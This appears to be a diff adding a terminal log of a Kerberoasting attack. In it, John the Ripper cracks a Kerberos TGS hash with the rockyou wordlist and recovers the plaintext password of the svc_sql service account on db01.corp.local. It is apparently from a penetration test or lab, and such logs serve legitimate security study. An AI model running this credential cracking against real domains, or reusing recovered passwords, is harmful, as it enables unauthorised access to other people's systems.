@@ -1,0 +1,16 @@
+$ john --wordlist=/usr/share/wordlists/rockyou.txt krb5tgs.hash
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 8 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Sql_Server_2019! (?)
+1g 0:00:00:12 DONE (2026-09-17 07:44) 0.08130g/s 682400p/s 682400c/s 682400C/s Sql_Server_2020!..Sql_Server_2018!
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+
+$ john --show krb5tgs.hash
+?:Sql_Server_2019!
+
+1 password hash cracked, 0 left
+
+[*] Recovered credential for service account svc_sql (SPN MSSQLSvc/db01.corp.local:1433)
